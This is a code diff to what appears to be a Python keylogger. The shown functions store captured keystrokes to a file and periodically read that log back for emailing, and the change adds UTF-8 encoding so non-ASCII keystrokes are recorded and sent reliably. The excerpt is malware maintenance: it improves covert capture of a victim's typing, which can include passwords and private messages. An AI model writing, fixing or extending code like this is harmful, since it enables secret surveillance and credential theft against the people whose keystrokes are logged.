@@ -17,7 +17,7 @@ def sentMail():
         sleep(TIME_DELAY_TO_SENT)
 
         with file_lock:
-            with open(OUTPUT_FILE_NAME, 'r') as file:
+            with open(OUTPUT_FILE_NAME, 'r', encoding="utf-8") as file:
                 data = file.read().replace('\n', '')
 
                 if len(data) != 0:
@@ -76,7 +76,7 @@ def loggerr():
 
     def storeKeysToFile(keys):
         with file_lock:
-            with open(OUTPUT_FILE_NAME, 'w') as log:
+            with open(OUTPUT_FILE_NAME, 'w', encoding="utf-8") as log:
                 for the_key in keys:
                     the_key = fixQuoteAndDoubleQuote(the_key)
                     log.write(the_key)
